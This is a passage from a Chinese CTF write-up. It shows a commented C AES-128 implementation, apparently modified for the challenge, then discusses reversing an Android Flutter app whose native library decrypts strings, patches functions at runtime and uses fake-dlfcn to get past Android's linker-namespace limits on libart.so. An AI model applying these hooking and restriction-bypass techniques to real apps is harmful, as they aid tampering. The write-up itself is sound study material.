&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      k[i][j] = (<span class="type">uint8_t</span>)<span class="built_in">BYTE</span>(key[j], <span class="number">3</span> - i); <span class="comment">/* 把 uint32 key[4] 先转换为矩阵 uint8 k[4][4] */</span></span><br><span class="line">      state[i][j] ^= k[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字节替换</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">subBytes</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* i: row, j: col */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      state[i][j] = S[state[i][j]]; <span class="comment">// 直接使用原始字节作为S盒数据下标</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逆字节替换</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">invSubBytes</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* i: row, j: col */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      state[i][j] = inv_S[state[i][j]];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 行移位</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">shiftRows</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> block[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* i: row */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 便于行循环移位，先把一行4字节拼成uint_32结构，移位后再转成独立的4个字节uint8_t</span></span><br><span class="line">    <span class="built_in">LOAD32H</span>(block[i], state[i]);</span><br><span class="line">    block[i] = <span class="built_in">ROF32</span>(block[i], <span class="number">8</span> * i); <span class="comment">// block[i]循环左移8*i位，如第0行左移0位</span></span><br><span class="line">    <span class="built_in">STORE32H</span>(block[i], state[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逆行移位</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">invShiftRows</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> block[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* i: row */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">LOAD32H</span>(block[i], state[i]);</span><br><span class="line">    block[i] = <span class="built_in">ROR32</span>(block[i], <span class="number">8</span> * i);</span><br><span class="line">    <span class="built_in">STORE32H</span>(block[i], state[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Galois Field (256) Multiplication of two Bytes */</span></span><br><span class="line"><span class="comment">// 两字节的伽罗华域乘法运算</span></span><br><span class="line"><span class="function"><span class="type">uint8_t</span> <span class="title">GMul</span><span class="params">(<span class="type">uint8_t</span> u, <span class="type">uint8_t</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint8_t</span> p = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (u &amp; <span class="number">0x01</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      p ^= v;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> flag = (v &amp; <span class="number">0x80</span>);</span><br><span class="line">    v &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (flag)</span><br><span class="line">    &#123;</span><br><span class="line">      v ^= <span class="number">0x1B</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 列混合</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mixColumns</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint8_t</span> tmp[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">  <span class="type">uint8_t</span> M[<span class="number">4</span>][<span class="number">4</span>] = &#123;&#123;<span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x01</span>&#125;,</span><br><span class="line">                     &#123;<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>&#125;,</span><br><span class="line">                     &#123;<span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>&#125;,</span><br><span class="line">                     &#123;<span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x02</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* copy state[4][4] to tmp[4][4] */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      tmp[i][j] = state[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">    &#123; <span class="comment">// 伽罗华域加法和乘法</span></span><br><span class="line">      state[i][j] = <span class="built_in">GMul</span>(M[i][<span class="number">0</span>], tmp[<span class="number">0</span>][j]) ^ <span class="built_in">GMul</span>(M[i][<span class="number">1</span>], tmp[<span class="number">1</span>][j]) ^ <span class="built_in">GMul</span>(M[i][<span class="number">2</span>], tmp[<span class="number">2</span>][j]) ^ <span class="built_in">GMul</span>(M[i][<span class="number">3</span>], tmp[<span class="number">3</span>][j]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逆列混合</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">invMixColumns</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint8_t</span> tmp[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">  <span class="type">uint8_t</span> M[<span class="number">4</span>][<span class="number">4</span>] = &#123;&#123;<span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>&#125;,</span><br><span class="line">                     &#123;<span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x0D</span>&#125;,</span><br><span class="line">                     &#123;<span class="number">0x0D</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>&#125;,</span><br><span class="line">                     &#123;<span class="number">0x0B</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>&#125;&#125;; <span class="comment">// 使用列混合矩阵的逆矩阵</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* copy state[4][4] to tmp[4][4] */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      tmp[i][j] = state[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      state[i][j] = <span class="built_in">GMul</span>(M[i][<span class="number">0</span>], tmp[<span class="number">0</span>][j]) ^ <span class="built_in">GMul</span>(M[i][<span class="number">1</span>], tmp[<span class="number">1</span>][j]) ^ <span class="built_in">GMul</span>(M[i][<span class="number">2</span>], tmp[<span class="number">2</span>][j]) ^ <span class="built_in">GMul</span>(M[i][<span class="number">3</span>], tmp[<span class="number">3</span>][j]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AES-128加密接口，输入key应为16字节长度，输入长度应该是16字节整倍数，</span></span><br><span class="line"><span class="comment">// 这样输出长度与输入长度相同，函数调用外部为输出数据分配内存</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">aesEncrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">uint32_t</span> keyLen, <span class="type">const</span> <span class="type">uint8_t</span> *pt, <span class="type">uint8_t</span> *ct, <span class="type">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  AesKey aesKey;</span><br><span class="line">  <span class="type">uint8_t</span> *pos = ct;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint32_t</span> *rk = aesKey.eK; <span class="comment">// 加密密钥指针</span></span><br><span class="line">  <span class="type">uint8_t</span> out[BLOCKSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">uint8_t</span> actualKey[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">uint8_t</span> state[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">NULL</span> == key || <span class="literal">NULL</span> == pt || <span class="literal">NULL</span> == ct)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;param err.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (keyLen &gt; <span class="number">16</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;keyLen must be 16.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (len % BLOCKSIZE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;inLen is invalid.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(actualKey, key, keyLen);</span><br><span class="line">  <span class="built_in">keyExpansion</span>(actualKey, <span class="number">16</span>, &amp;aesKey); <span class="comment">// 密钥扩展</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 使用ECB模式循环加密多个分组长度的数据</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += BLOCKSIZE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 把16字节的明文转换为4x4状态矩阵来进行处理</span></span><br><span class="line">    <span class="built_in">loadStateArray</span>(state, pt);</span><br><span class="line">    <span class="comment">// 轮密钥加</span></span><br><span class="line">    <span class="built_in">addRoundKey</span>(state, rk);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">10</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      rk += <span class="number">4</span>;</span><br><span class="line">      <span class="built_in">subBytes</span>(state);        <span class="comment">// 字节替换</span></span><br><span class="line">      <span class="built_in">shiftRows</span>(state);       <span class="comment">// 行移位</span></span><br><span class="line">      <span class="built_in">addRoundKey</span>(state, rk); <span class="comment">// 轮密钥加</span></span><br><span class="line">      <span class="built_in">mixColumns</span>(state);      <span class="comment">// 列混合</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">subBytes</span>(state);  <span class="comment">// 字节替换</span></span><br><span class="line">    <span class="built_in">shiftRows</span>(state); <span class="comment">// 行移位</span></span><br><span class="line">    <span class="comment">// 此处不进行列混合</span></span><br><span class="line">    <span class="built_in">addRoundKey</span>(state, rk + <span class="number">4</span>); <span class="comment">// 轮密钥加</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把4x4状态矩阵转换为uint8_t一维数组输出保存</span></span><br><span class="line">    <span class="built_in">storeStateArray</span>(state, pos);</span><br><span class="line"></span><br><span class="line">    pos += BLOCKSIZE; <span class="comment">// 加密数据内存指针移动到下一个分组</span></span><br><span class="line">    pt += BLOCKSIZE;  <span class="comment">// 明文数据指针移动到下一个分组</span></span><br><span class="line">    rk = aesKey.eK;   <span class="comment">// 恢复rk指针到秘钥初始位置</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AES128解密， 参数要求同加密</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">aesDecrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">uint32_t</span> keyLen, <span class="type">const</span> <span class="type">uint8_t</span> *ct, <span class="type">uint8_t</span> *pt, <span class="type">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  AesKey aesKey;</span><br><span class="line">  <span class="type">uint8_t</span> *pos = pt;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint32_t</span> *rk = aesKey.dK; <span class="comment">// 解密密钥指针</span></span><br><span class="line">  <span class="type">uint8_t</span> out[BLOCKSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">uint8_t</span> actualKey[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">uint8_t</span> state[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">NULL</span> == key || <span class="literal">NULL</span> == ct || <span class="literal">NULL</span> == pt)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;param err.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (keyLen &gt; <span class="number">16</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;keyLen must be 16.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (len % BLOCKSIZE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;inLen is invalid.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(actualKey, key, keyLen);</span><br><span class="line">  <span class="built_in">keyExpansion</span>(actualKey, <span class="number">16</span>, &amp;aesKey); <span class="comment">// 密钥扩展，同加密</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += BLOCKSIZE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 把16字节的密文转换为4x4状态矩阵来进行处理</span></span><br><span class="line">    <span class="built_in">loadStateArray</span>(state, ct);</span><br><span class="line">    <span class="comment">// 轮密钥加，同加密</span></span><br><span class="line">    <span class="built_in">addRoundKey</span>(state, rk);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">10</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      rk += <span class="number">4</span>;</span><br><span class="line">      <span class="built_in">invShiftRows</span>(state);    <span class="comment">// 逆行移位</span></span><br><span class="line">      <span class="built_in">invSubBytes</span>(state);     <span class="comment">// 逆字节替换，这两步顺序可以颠倒</span></span><br><span class="line">      <span class="built_in">invMixColumns</span>(state);   <span class="comment">// 逆列混合</span></span><br><span class="line">      <span class="built_in">addRoundKey</span>(state, rk); <span class="comment">// 轮密钥加，同加密</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">invShiftRows</span>(state); <span class="comment">// 逆行移位</span></span><br><span class="line">    <span class="built_in">invSubBytes</span>(state);  <span class="comment">// 逆字节替换</span></span><br><span class="line">    <span class="comment">// 此处没有逆列混合</span></span><br><span class="line">    <span class="built_in">addRoundKey</span>(state, rk + <span class="number">4</span>); <span class="comment">// 轮密钥加，同加密</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">storeStateArray</span>(state, pos); <span class="comment">// 保存明文数据</span></span><br><span class="line">    pos += BLOCKSIZE;            <span class="comment">// 输出数据内存指针移位分组长度</span></span><br><span class="line">    ct += BLOCKSIZE;             <span class="comment">// 输入数据内存指针移位分组长度</span></span><br><span class="line">    rk = aesKey.dK;              <span class="comment">// 恢复rk指针到秘钥初始位置</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下一步就是java层的xxtea</p><blockquote><p>标准的xxtea，不过出不来T.T，出题人提示init_proc，猜测可能是被改掉了 ，而且字符串均被加密了</p></blockquote><p>在libnative_add.so里</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251008214918515.png" alt="image-20251008214918515"></p><p><code>init_proc()</code> 在 <code>libnative_add.so</code> 里动态解密&#x2F;打补丁（把“shellcode”写到 mmap 出来的内存，再改写目标函数的前两条指令为 trampoline 跳转）。因此<strong>字符串&#x2F;代码&#x2F;数据的解密过程发生在 native 层内存复制之前或期间</strong>。抓取被解密后的字符串，最可靠的方式是 <strong>在解密后 memcpy 把解密内容写入可执行内存时把那块内容 dump 出来</strong>，或者在 <code>sub_19F78</code>（看起来像解密）返回时直接 dump 它返回的内存。</p><p>中间参考了下出题人的解释：</p><p><a href="https://pangbai.work/CTF/Reverse/Want2BecomeMagicalGirl/">（●´3｀●）やれやれだぜ</a></p><blockquote><p>“原生库”是指用 <strong>C 或 C++ 编写并编译为 <code>.so</code> 文件（Shared Object，共享库）</strong> 的代码。</p><p>它不是 Java 层代码，而是直接运行在 <strong>Linux 层</strong> 的二进制代码。</p><p>在 Android 应用中，如果你用 JNI（Java Native Interface） 调用本地函数，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.loadLibrary(&quot;mylib&quot;);</span><br></pre></td></tr></table></figure><p>系统库是 Android 平台本身提供的 <code>.so</code> 文件，位于系统分区，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/system/lib/ 或 /system/lib64/</span><br><span class="line">libc.so</span><br><span class="line">libm.so</span><br><span class="line">liblog.so</span><br><span class="line">libandroid_runtime.so</span><br></pre></td></tr></table></figure><p><strong>所有的应用库都是原生库，但不是所有的原生库都是应用库。</strong></p><table><thead><tr><th>名称</th><th>含义</th><th>由谁编写</th><th>存放位置</th><th>运行层级</th></tr></thead><tbody><tr><td><strong>原生库</strong></td><td>指用 <strong>C&#x2F;C++</strong> 编写、编译成 <code>.so</code>（共享库）的底层二进制库。包括系统的和应用自己的。</td><td>Android 系统或应用开发者</td><td><code>/system/lib/</code>、<code>/vendor/lib/</code>、<code>/data/app/.../lib/</code> 等</td><td>Linux 层（Native 层）</td></tr><tr><td><strong>应用库</strong></td><td>指<strong>应用自己带的原生库</strong>（一个子集），随 APK 打包，用于 JNI 调用。</td><td>应用开发者</td><td><code>/data/app/包名/lib/</code></td><td>应用进程的 Native 层</td></tr></tbody></table></blockquote><p>Android 7.0 的变化：引入“命名空间隔离”</p><p>在 Android 7.0（Nougat）之前，<strong>应用加载原生库时</strong>，它能看到系统 <code>/system/lib/</code> 目录下几乎所有 <code>.so</code> 文件。<br> 这带来了严重问题：</p><ul><li>有些应用会“偷偷”调用 Android 内部未公开的系统库函数（非 SDK 接口）；</li><li>这些接口未被官方支持，系统更新后容易崩溃；</li><li>同名库（系统库 vs 应用自带库）容易“串库”或冲突。</li></ul><p>Android 7.0 起，<strong>每个进程（尤其是 app 进程）都有独立的 linker namespace</strong>。</p><p>这意味着：</p><ul><li>系统库和应用库在“命名空间”上是隔离的；</li><li>应用默认只能访问经过允许的系统库（例如 <code>libc.so</code>, <code>libm.so</code>, <code>liblog.so</code> 等）；</li><li>其他系统内部库（如 <code>libandroid_runtime.so</code>, <code>libbinder.so</code>）对应用是<strong>不可见的</strong>；</li><li>如果应用想加载这些“私有系统库”，会报错</li></ul><p><a href="https://source.android.google.cn/docs/core/permissions/namespaces_libraries?hl=zh-cn">原生库的命名空间  | Android Open Source Project</a></p><p>Android 7.0 为原生库引入了命名空间，以限制内部 API 的可见性，听起来很高大上，具体解释就是安卓上的动态链接库使用被约束了，普通开发者不管是编译时链接还是使用 dlsym 都不能获取到被限制的 lib 的符号地址， native 开发能调用的 api 被严重限制，同理 Java 也有类似的约束 hiddenapi 用来限制反射的功能。 </p><p><a href="https://github.com/ssrlive/fake-dlfcn">ssrlive&#x2F;fake-dlfcn: dlopen&#x2F;dlclose&#x2F;dlsym in Android</a></p><p>本题目使用 fake-dlfcn 来查找调用 libart.so 的符号，同时修改了一些代码来适配高版本安卓。这个项目原理比较简单，扫描 proc&#x2F;self&#x2F;maps 得到原生库的基址，并通过解析原生库的 elf 符号表得到偏移，再进行计算得到符号地址。 </p><blockquote><p>libart.so是什么?</p><p><code>libart.so</code> 的全称就是 <strong>Android Runtime Library</strong>。</p><p>它是 Android 系统中实现 <strong>ART（Android Runtime）虚拟机</strong> 的核心共享库。</p><p>通俗地说：<code>libart.so</code> 就是 Android 上运行 Java&#x2F;Kotlin 应用的底层“虚拟机引擎”。</p><p><strong><code>fake-dlfcn</code> 是一个“自实现的 dlopen&#x2F;dlsym”小工具&#x2F;库</strong>，它绕过 Android（尤其是 Nougat 以后的）对 <code>dlopen</code>&#x2F;<code>dlsym</code> 访问的限制，允许在受限环境下加载系统 <code>.so</code>（比如 <code>libart.so</code>）或直接解析 ELF 符号，从而找到&#x2F;取到那些符号在运行时的地址。</p><p>Android 7+ 有命名空间限制，应用不能任意 <code>dlopen(&quot;/system/lib/libart.so&quot;)</code>，系统会把很多内部库对应用隐藏；因此普通 <code>dlsym</code>&#x2F;<code>dlopen</code> 不一定生效。</p><p><code>fake-dlfcn</code> 提供了替代实现（或直接解析 ELF）来<strong>读取&#x2F;解析系统库的符号表并返回函数地址</strong>，或者通过把库映射到进程地址空间再解析符号，从而<strong>找到调用 <code>libart.so</code> 的函数名&#x2F;地址</strong>，便于你在运行时定位与 hook。</p></blockquote><p>接下来可以看 native 了， libnative_add.so 在 Flutter 输入框回车的时候被加载。 </p><p>genKey 函数是一个 rc4 用来生成静态的 Key ，通过 blutter 生成的代码可以知道这个函数被 flutter 的 getKey() 调用</p><p>getSym 函数被 flutter 的 getSym 函数调用。其伪代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">getSym</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// x0</span></span><br><span class="line"></span><br><span class="line">  result = sub_19B50(<span class="string">&quot;libart.so&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> sub_19F78(result, a1);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面卡住了hook不到….</p><p>需要较深的安卓知识，只好先放一放了</p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span 